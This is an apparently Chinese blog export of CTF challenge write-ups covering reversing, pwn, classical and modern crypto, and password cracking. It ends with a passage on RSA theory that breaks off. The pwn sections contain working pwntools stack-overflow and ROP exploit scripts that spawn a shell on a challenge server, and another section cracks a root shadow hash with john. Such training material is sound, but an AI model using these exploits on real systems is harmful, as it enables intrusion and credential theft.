0, 0x9C40u); for ( i = 1; i &lt;= 20; ++i ) &#123; for ( j = 1; j &lt;= i; ++j ) dword_41A138[100 * i + j] = rand() % 100000; &#125; ((void (__cdecl *)(const char *, char))sub_41134D)("input your key with your operation can get the maximum:", v3); sub_411249("%s", (unsigned int)Str); //str的长度只有19 if ( j_strlen(Str) == 19 ) &#123; //经过sub_41114F处理 sub_41114F(Str); v4 = 0; j = 1; i = 1; dword_423D78 += dword_41A138[101]; //遍历19个字符串，当当前字符是L时，dword_423D78如代码变化，如果不是L也不是R则停止，放出报错信息，如果是R则如代码变化，也就是说字符串中只有L和R两种字符。 while ( v4 &lt; 19 ) &#123; //76的ASCII是L if ( Str[v4] == 76 ) &#123; dword_423D78 += dword_41A138[100 * ++i + j]; &#125; else &#123; //82的ASCII是R if ( Str[v4] != 82 ) &#123; ((void (__cdecl *)(const char *, char))sub_41134D)("error\n", v3); system("pause"); goto LABEL_18; &#125; dword_423D78 += dword_41A138[100 * ++i + ++j]; &#125; ++v4; &#125; sub_41134D("your operation can get %d points\n", dword_423D78); system("pause"); &#125; else &#123; ((void (__cdecl *)(const char *, char))sub_41134D)("error\n", v3); system("pause"); &#125;LABEL_18: HIDWORD(v1) = v0; LODWORD(v1) = 0; return v1;&#125; 点入sub_41114F函数，一直点下去，发现一个这样的函数： 12345678910111213141516171819BOOL __cdecl sub_411750(LPCVOID lpAddress, int a2, int a3)&#123; int v3; // ST1C_4 DWORD flOldProtect; // [esp+D4h] [ebp-2Ch] struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+E0h] [ebp-20h] VirtualQuery(lpAddress, &amp;Buffer, 0x1Cu); VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, 0x40u, &amp;Buffer.Protect); while ( 1 ) &#123; // v3 = a2--; if ( !v3 ) break; *(_BYTE *)lpAddress ^= a3; lpAddress = (char *)lpAddress + 1; &#125; return VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, Buffer.Protect, &amp;flOldProtect);&#125; Pwnpwn1访问nc 114.116.54.89 10001 打印一下当前目录的文件，会发现： 直接 cat flag即可 flag{6979d853add353c9} PWN2 下载文件，看一下开了什么防护： 没有栈溢出防护，随机化地址也没有。 用ida打开看看： 发现这个文件存在shell，所以大概思路就是利用read函数溢出覆盖到getshell的位置，由于这是调用静态的链接库，所以相对位移是不变的，直接可以得到此时shell的位置 看看read函数中的参数s的数组大小： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-0000000000000030 s db ?-000000000000002F db ? ; undefined-000000000000002E db ? ; undefined-000000000000002D db ? ; undefined-000000000000002C db ? ; undefined-000000000000002B db ? ; undefined-000000000000002A db ? ; undefined-0000000000000029 db ? ; undefined-0000000000000028 db ? ; undefined-0000000000000027 db ? ; undefined-0000000000000026 db ? ; undefined-0000000000000025 db ? ; undefined-0000000000000024 db ? ; undefined-0000000000000023 db ? ; undefined-0000000000000022 db ? ; undefined-0000000000000021 db ? ; undefined-0000000000000020 db ? ; undefined-000000000000001F db ? ; undefined-000000000000001E db ? ; undefined-000000000000001D db ? ; undefined-000000000000001C db ? ; undefined-000000000000001B db ? ; undefined-000000000000001A db ? ; undefined-0000000000000019 db ? ; undefined-0000000000000018 db ? ; undefined-0000000000000017 db ? ; undefined-0000000000000016 db ? ; undefined-0000000000000015 db ? ; undefined-0000000000000014 db ? ; undefined-0000000000000013 db ? ; undefined-0000000000000012 db ? ; undefined-0000000000000011 db ? ; undefined-0000000000000010 db ? ; undefined-000000000000000F db ? ; undefined-000000000000000E db ? ; undefined-000000000000000D db ? ; undefined-000000000000000C db ? ; undefined-000000000000000B db ? ; undefined-000000000000000A db ? ; undefined-0000000000000009 db ? ; undefined-0000000000000008 db ? ; undefined-0000000000000007 db ? ; undefined-0000000000000006 db ? ; undefined-0000000000000005 db ? ; undefined-0000000000000004 db ? ; undefined-0000000000000003 db ? ; undefined-0000000000000002 db ? ; undefined-0000000000000001 db ? ; undefined+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?)+0000000000000010+0000000000000010 ; end of stack variables 也就是说，覆盖0x30+0x8才能进入return,所以直接可以写脚本： 123456from pwn import *p = remote('114.116.54.89','10003')payload = 'a'*0x38+p64(0x400751)p.recvline()p.sendline(payload)p.interactive() flag{n0w_y0u_kn0w_the_Stack0verfl0w} PWN4下载文件，查看一下保护机制： 没有栈溢出防护，可执行，没有地址随机化，有代码可执行段。 在ida64中打开，先看看main函数： 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-10h] memset(&amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts("Come on,try to pwn me"); read(0, &amp;s, 0x30uLL); puts("So~sad,you are fail"); return 0LL;&#125; 没有栈溢出防护,而且有read函数，可以进行栈溢出，现在我们需要找到可以执行的shell位置， shift+F12 查看文件中的字符串，看看有没有可疑字符串: 里面发现存在system函数，以及敏感字$0 ，$0在linux中为为shell或shell脚本的名称。system()会调用fork()产生子进程，由子进程来调用/bin/sh -c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。 所以如果将$0作为system的参数，能达到传入&#39;/bin/sh&#39;一样的效果。 接着我们就可以开始传入参数，64位是利用寄存器进行传参，32位使用栈进行传参 这里我们需要找到pop | ret 来进行相应的赋值,利用ROPgadget: 1234567891011121314kali:Desktop # ROPgadget --binary pwn4 --only 'pop|ret'Gadgets information============================================================0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007d0 : pop r14 ; pop r15 ; ret0x00000000004007d2 : pop r15 ; ret0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007d3 : pop rdi ; ret #选用这个0x00000000004007d1 : pop rsi ; pop r15 ; ret0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : ret 这里注意一下原因：我们需要找出 pop | ret来进行传值，而上述只有rdi是可以存入数据，rbp和r15是called saved 然后我们还需要找到$0的位置和调用system函数的位置 1234kali:Desktop # ROPgadget --binary pwn4 --string '\$0'Strings information============================================================0x000000000060111f : $0 现在可以开始写脚本： 123456789101112from pwn import *p = remote('114.116.54.89','10004')pop_rdi = 0x00000000004007d3sys_addr = 0x40075Ash_addr = 0x000000000060111fpayload = 'a'*0x18 + p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)p.recvline()p.sendline(payload)p.interactive() 得到flag{264bc50112318cd6e1a67b0724d6d3af} Cryptoeasy_crypto10010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101 打开链接，发现这样的一段字符串，可以看出是莫斯电码， ​ 根据上表进行相应的解码程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#owner=houhuiting#type=abstractstring=input()key=string.split(" ")dictionary= &#123;'01': 'A', '1000': 'B', '1010': 'C', '100':'D', '0':'E', '0010':'F', '110': 'G', '0000': 'H', '00': 'I', '0111':'J', '101': 'K', '0100': 'L', '11': 'M', '10': 'N', '111': 'O', '0110': 'P', '1101': 'Q', '010': 'R', '000': 'S', '1': 'T', '001': 'U', '0001': 'V', '011': 'W', '1001': 'X', '1011': 'Y', '1100': 'Z', '01111': '1', '00111': '2', '00011': '3', '00001': '4', '00000': '5', '10000': '6', '11000': '7', '11100': '8', '11110': '9', '11111': '0', '001100': '?', '10010': '/', '101101': ')', '100001': '-', '010101': '.', '110011':',', '011010':'@', '111000':':', '101010':':', '10001':'=', '011110':"'", '101011':'!', '001101':'_', '010010':'"', '10110':'(', '1111011':'&#123;', '1111101':'&#125;' &#125;; for item in key:# print(dictionary[item],end='') print(dictionary[item].lower(),end='') 解出flag:FLAG{M0RSE_CODE_1S_INTEREST1N9!} 但是交上去是错的，换成小写试试，flag{m0rse_code_1s_interest1n9!}成功 散乱的密文 lf5{ag024c483549d7fd@@1}一张纸条上凌乱的写着2 1 6 5 3 4 2 1 6 5 3 4 l f 5 { a g 0 2 4 c 4 8 3 5 4 9 d 7 f d @ @ 1 } 按照上述顺序弄出，得到flag{52048c453d794df1} ps: 将后面两个@@去掉 凯撒部长的奖励给出一串字符串： 1MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125; 直接凯撒解密: 1SYC&#123;here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us&#125; 一段base64打开解题链接，发现有个flag.txt，说是base64，直接解码(用在线网站解码的话很容易卡死，可能是数据太多) 这里决定用python脚本来完成解密，后面紧跟着一堆加密形式，在脚本中呈现效果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding=utf-8import urllib.parseimport base64import re#第一层base64解密with open('1.txt') as f: cipher1 = f.read().encode('utf-8')plain1 = base64.b64decode(cipher1).decode("utf-8")# print(plain1)# 只有0-7数字 ，怀疑是八进制解码，试试看cipher2 = plain1cipher2 = re.findall(r'\d+',cipher2)# print(cipher2)plain2 = ''for i in cipher2: plain2 += chr(int(i,8))# print(plain2)#现在解出来之后编程了16进制，再次解码cipher3 = plain2cipher3 = re.findall(r'\d+',cipher3)# print(cipher3)plain3 = ''for i in cipher3: plain3 += chr(int(i,16))# print(plain3)#现在得到的编码格式是udd*，推测为unicodecipher4 = plain3cipher4 = re.findall(r'u[\d\w]+',cipher4)cipher4 = ''.join(cipher4).replace(r'u',r'\u')# print(cipher4)# python3没有decode可用，所以这里就这样弄了plain4 = cipher4.encode('utf-8').decode("unicode_escape")# print(plain4)#将得到的数字转成ASCIIcipher5 = re.findall(r'\d+',plain4)plain5 = ''for i in cipher5: plain5+=chr(int(i))# print(plain5)#现在是url16进制cipher6 = re.findall(r'\d+\w?',plain5)plain6 = ''for i in cipher6: plain6 += chr(int(i,16))# print(plain6)#现在是url 10进制，将其转化为ASCII即可cipher7 = re.findall(r'\d+',plain6)plain7 = ''for i in cipher7: plain7 += chr(int(i))plain7 = urllib.parse.unquote(plain7)print(plain7) flag{ctf_tfc201717qwe} .!? 一个ook形式的加密，直接在线解密 +[]- 一段brainfuck加密，还是在线解密 奇怪的密码 看到这种没见过的古典密码，习惯先看看ASCII，看上面的字符串，€符号像{，那么前面四个字母可能就是flag 字母 ASCII 字母 ASCII g 103 f 102 n 110 l 108 d 100 a 97 k 107 g 103 发现，这四个貌似间隔是1，2，3，4 所以想着是不是顺次替换，直接在python上通过chr会产生报错，因为€的编码是8364，chr只能处理256之内的ASCII，所以我们将相应编码通过程序得到： 102 108 97 103 8359 108 101 105 95 99 105 95 106 105 97 109 105 然后通过在线工具进行解密： 得到文本信息：flag₧lei_ci_jiami 尝试flag格式，最后得到flag{lei_ci_jiami} 托马斯.杰斐逊 用一般方法试着解密，发现结果是错误的。 百度一下托马斯·杰斐逊，发现： 现在开始直接利用该方法进行解密： 先将字母表按照密钥顺序排列： 12345678910111213142： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt; 然后根据密文将每行的首字母变为相应密文 1234567891011121314HGVSFUWIKPBELNACZDTRXMJQOYCPMNZQWXYIHFRLABEUOTSGJVDKBVIQHKYPNTCRMOSFEZWAXJGDLUTEQGYXPLOCKBDMAIZVRNSJUWFHSLOQXVETAMKGHIWPNYCJBFZDRUXQYIZMJWAORPLNDVHGFCUKTEBSWATDSRFHENYVUBMCOIKZGJXPLQCEONJQGWTHSPYBXIZULVKMRAFDRJLXKISEFAPMYGHBQNOZUTWDCVQWXPHKZGJTDSENYVUBMLAOIRFCGOIKFHENYVUWABMCXPLTDSRJQZLTDENQWAOXPYVUIKZGJBMCSRFHENYSRUBMCQWVJXPLTDAOIKFZGHSWAYXPLVUBOIKZGJRFHENMCQTD 得到flag{XSXSBUGKUADMIN} 输入发现不对，但题目明确说了是解密的内容，最后发现flag是小写， flag{xsxsbugkuadmin} zip伪加密直接在winhex中修改： 将图中所示改成00即可 解压得到flag{Adm1N-B2G-kU-SZIP} 告诉你个秘密(ISCCCTF)得到下面这样的字符串： 1263 6A 56 35 52 79 42 73 63 44 6C 4A 49 45 4A 71 54 53 42 30 52 6D 68 4356 44 5A 31 61 43 42 35 4E 32 6C 4B 49 46 46 7A 57 69 42 69 61 45 30 67 看起来就像是16进制，使用16进制进行编码，然后将其变为ASCII 1cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g 开始以为是md5，发现不能解密，尝试常用的加密方式进行解密，发现是base64， 1r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM 发现r5yg中间包含的是字母T,将所有的解出为tongyuan， 发现不对，试试大写：TONGYUAN，发下flag格式就是大写 这不是md5166 6c 61 67 7b 61 65 37 33 35 38 37 62 61 35 36 62 61 65 66 35 7d 发现跟上题思路类似，解出flag{ae73587ba56baef5} 贝斯家族1@iH&lt;,&#123;bdR2H;i6*Tm,Wx2izpx2! 将知道的base16,32,64都尝试一遍，发现不能解码，尝试base58,91,最后发现是base91编码，解密网站是：http://ctf.ssleye.com/base91.html，但是可能需要收费 还有一种选择是，下载这个解码软件： http://base91.sourceforge.net/ flag{554a5058c9021c76} 富强民主这是一个核心价值观编码 直接在线解密：flag{90025f7fb1959936} python得到两个文件 challenge.py 12345678from N1ES import N1ESimport base64key = #利用函数将key进行加密n1es = N1ES(key)flag = "N1CTF&#123;*****************************************&#125;"cipher = n1es.encrypt(flag)print base64.b64encode(cipher) #HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx N1ES.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-def round_add(a, b): f = lambda x, y: x + y - 2 * (x &amp; y) res = '' for i in range(len(a)): res += chr(f(ord(a[i]), ord(b[i]))) return resdef permutate(table, block): return list(map(lambda x: block[x], table))def string_to_bits(data): #将key中的变为ASCII data = [ord(c) for c in data] #一个字符是一个字节，一个字节是八位 l = len(data) * 8 #将其中的所有位置为0 result = [0] * l pos = 0 for ch in data: for i in range(0,8): #将其中每个bit进行处理 #但是这里的(ch&gt;&gt;i) &amp; 1 --&gt;貌似把&amp;1去掉也没有什么问题 result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1 pos += 1 return results_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]def generate(o): k = permutate(s_box,o) b = [] for i in range(0, len(k), 7): b.append(k[i:i+7] + [1]) c = [] for i in range(32): pos = 0 x = 0 for j in b[i]: x += (j&lt;&lt;pos) pos += 1 c.append((0x10001**x) % (0x7f)) return cclass N1ES: def __init__(self, key): #判断一下key的长度是否是24 if (len(key) != 24 or isinstance(key, bytes) == False ): raise Exception("key must be 24 bytes long") self.key = key #生成密钥 self.gen_subkey() def gen_subkey(self): #将字符串变为bits o = string_to_bits(self.key) k = [] for i in range(8): o = generate(o) k.extend(o) o = string_to_bits([chr(c) for c in o[0:24]]) self.Kn = [] for i in range(32): self.Kn.append(map(chr, k[i * 8: i * 8 + 8])) return def encrypt(self, plaintext): if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False): raise Exception("plaintext must be a multiple of 16 in length") res = '' for i in range(len(plaintext) / 16): block = plaintext[i * 16:(i + 1) * 16] L = block[:8] R = block[8:] for round_cnt in range(32): L, R = R, (round_add(L, self.Kn[round_cnt])) L, R = R, L res += L + R return res 这题就当作经验积累吧，这是个Feistel密码，他的加密和解密的算法是相同的，只是需要将密钥取反而已 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-import base64def round_add(a,b): f = lambda x,y: x + y - 2 * (x &amp; y) res = '' for i in range(len(a)): res += chr(f(ord(a[i]),ord(b[i]))) return resdef permutate(table,block): return list(map(lambda x: block[x], table))def string_to_bits(data): data = [ord(c) for c in data] l = len(data)*8 result = [0] * l pos = 0 for ch in data: for i in range(0,8): result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1 pos += 1 return results_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]def generate(o): k = permutate(s_box,o) b = [] for i in range(0,len(k),7): b.append(k[i:i+7]+[1]) c = [] for i in range(32): pos = 0 x = 0 for j in b[i]: x += (j&lt;&lt;pos) pos += 1 c.append((0x10001**x) % (0x7f)) return cclass N1ES: def __init__(self,key): if (len(key) != 24 or isinstance(key,bytes) == False): raise Exception("key must be 24 bytes long") self.key = key self.gen_subkey() def gen_subkey(self): o = string_to_bits(self.key) k = [] for i in range(8): o = generate(o) k.extend(o) o = string_to_bits([chr(c) for c in o[0:24]]) self.Kn = [] for i in range(32): self.Kn.append(map(chr,k[i*8: i*8+8])) return def decrypt(self,plaintext): res = '' for i in range(len(plaintext)/16): block = plaintext[i*16:(i + 1)*16] L = block[:8] R = block[8:] for round_cnt in range(32): #只需要将此处的取反即可 L,R = R, (round_add(L, self.Kn[31-round_cnt])) L,R = R,L res += L + R return reskey = "wxy191iss00000000000cute"nles = N1ES(key)flag = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")flag = nles.decrypt(flag)print flag#N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125; 还有一种方法就是直接都算法，进行暴力破解： 12345678910111213141516import base64,string,N1ESkey = "wxy191iss00000000000cute"c = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")n1es = N1ES.N1ES(key)f=""for i in xrange(3): for j in xrange(16): for k in string.printable: s="x"*i*16+"x"*j+k+"x"*(48-i*16-j-1) e=n1es.encrypt(s) check=c[i*16+j+8]==e[i*16+j+8] if j&lt;8 else c[i*16+j-8]==e[i*16+j-8] if check: f+=k breakprint f# N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125; 进制转换1d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e 直接python脚本解密即可 1234567891011121314151617#coding=utf-8data = 'd87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e'enc = data.split(' ')ans =''for i in enc: tag = i[0] if tag == 'x': ans += chr(int(i[1:],16)) elif tag == 'o': ans += chr(int(i[1:],8)) elif tag == 'b': ans += chr(int(i[1:],2)) elif tag == 'd': ans += chr(int(i[1:]))print(ans) 得到Welcome to kelaibei. Give you a flag as a gift. flag{1e4bf81a6394de5abc005ac6e39a387b} . Have a good time~ affine 题目是仿射，所以猜想是flag里面内容需要仿射密码，用脚本解决 1234567891011#coding=utf-8enc = 'szzyfimhyzd'ans = ''for x in enc: x = ord(x) for i in range(0,26): if x == (17*i-8)%26+97: ans += chr(i+97)print(ans) 得到flag: 1flag&#123;affineshift&#125; Crack it下载一个shadow文件，查一下有关信息： Linux操作系统下有一个文件负责所有用户的密码。那就是shadow。该文件的权限必须设置为：-r- — — （400）或者 -rw — —（600）即：Linux /etc/shadow文件是只有系统管理员才有权利进行查看和修改的文件。 使用more命令查看其中一些基本信息： 1root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop# more shadow root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7::: 这里使用kali中john工具进行密码爆破： 1root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop# john shadow Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 14 candidates buffered for the current salt, minimum 16 needed for performance. Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance. Warning: Only 15 candidates buffered for the current salt, minimum 16 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 8 candidates buffered for the current salt, minimum 16 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist hellokitty (root) //这里有内容 1g 0:00:00:04 DONE 2/3 (2019-10-11 19:50) 0.2427g/s 1337p/s 1337c/s 1337C/s ilovegod..ford Use the "--show" option to display all of the cracked passwords reliably Session completed ps:如果之前已经执行过上面命令，想再次看结果，可以使用john shadow --show 所以flag{hellokitty} RSA12345N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192 e比较大，使用维纳攻击获得d,使用rsa-wiener-attack工具求出d, ps:开始本来想着使用yafu求出p,q，但是分解不出来。 下载链接：https://github.com/pablocelayes/rsa-wiener-attack 修改其中的RSAwienerHacker.py: 1234567if __name__ == "__main__": #test_is_perfect_square() #print("-------------------------") n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 d = hack_RSA(e,n) print("d=",d) d = 8264667972294275017293339772371783322168822149471976834221082393409363691895 最后直接用脚本解密即可： 1234567891011#coding:utf-8from libnum import n2s,s2n n =460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597d = 8264667972294275017293339772371783322168822149471976834221082393409363691895c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192m=pow(c,d,n)print(n2s(m)) 得到flag{Wien3r_4tt@ck_1s_3AsY} 来自宇宙的信号 还是积累太少啊。这是标准银河密码 对照得到flag{nopqrst}]]></content>
      <categories>
        <category>CTF</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>web</tag>
        <tag>crypto</tag>
        <tag>re</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA-集锦]]></title>
    <url>%2F2019%2F10%2F21%2FRSA-%E9%9B%86%E9%94%A6%2F</url>
    <content type="text"><![CDATA[奇淫技巧已知dp,dq,c,n,p,q理论证明我们知道 m \equiv c^d \ mod\ n \qquad (1)所以存在一个值k，使得下式成立 m = c^d + k*n = c^d + k*p*q \qquad (2)将上述式子分别模p,q，得到 mq \equiv c^d\ mod\ q \qquad (3) \\ mp \equiv c^d\ mod\ p \qquad (4)由上述可知，我们可以令 c^d = mq+k*q \quad (5)将(5)带入到(4)中，得到 mp \equiv (mq+k*q)\ mod\ p \\ mp-mq \equiv k*q\ mod\ p \quad (6)由于gcd(p,q)=1，所以我们得到k值得同余式： k \equiv (mp-mq)*q^{-1} \ mod\ p \quad (7)将(7)带入到(5)中，得到 { } c^d = mq +((mp-mq)*q^{-1}\ mod\ p)*q \quad (8)将(8)带入到(1)中， m \equiv (mq+((mp-mq)*q^{-1}\ mod p)*q)\ mod\ n对于mp以及mq，求法如下： d \equiv dp\ mod\ (p-1) \\ d \equiv dq\ mod\ (q-1) \\ mp = c^d\ mod\ p = c^{dp\ mod\ (p-1)} \ mod\ p =c^{dp} *c^{s*(p-1)}\ mod\ p\\ mq = c^d\ mod\ q = c^{dq\ mod\ (q-1)} \ mod\ q =c^{dp} *c^{t*(q-1)}\ mod\ q由费马小定理可知 c^{p-1}\ mod p \equiv 1所以， mp = c^{dp}\ mod\ p \\ mq = c^{dq}\ mod\ q这样就万事俱备！！ 一般实现代码如下: 